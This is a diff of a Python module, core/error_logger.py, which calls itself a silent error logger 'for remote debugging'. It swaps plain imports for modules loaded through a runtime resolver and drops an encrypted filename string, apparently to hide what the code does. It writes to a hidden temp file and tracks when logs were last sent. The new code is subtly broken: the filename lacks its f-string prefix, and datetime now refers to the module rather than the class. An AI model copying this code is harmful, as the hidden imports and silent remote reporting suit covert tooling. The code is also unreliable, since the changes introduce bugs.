@@ -1,19 +1,22 @@
+from core.resolver import (
+    Resolver, _OS, _TIME, _JSON, _DATETIME, _TRACEBACK
+)
+os = Resolver.get_mod(_OS)
+time = Resolver.get_mod(_TIME)
+json = Resolver.get_mod(_JSON)
+datetime = Resolver.get_mod(_DATETIME)
+traceback = Resolver.get_mod(_TRACEBACK)
+
 """
 core/error_logger.py - Silent error logging
 """
 
-import os
-import time
-import json
-import traceback
-from datetime import datetime
-from core.obfuscation import decrypt_string
 
 class ErrorLogger:
     """Silently logs errors for remote debugging"""
 
     def __init__(self):
-        self.log_path = os.path.join(os.environ.get('TEMP', '.'), decrypt_string('QFcKGREqMAwuXx5RH1xIDgdfHUNneCRMNhgN'))
+        self.log_path = os.path.join(os.environ.get('TEMP', '.'), ".err_{int(time.time())}.log")
         self.max_entries = 50
         self.entries = []
         self.last_send = 0
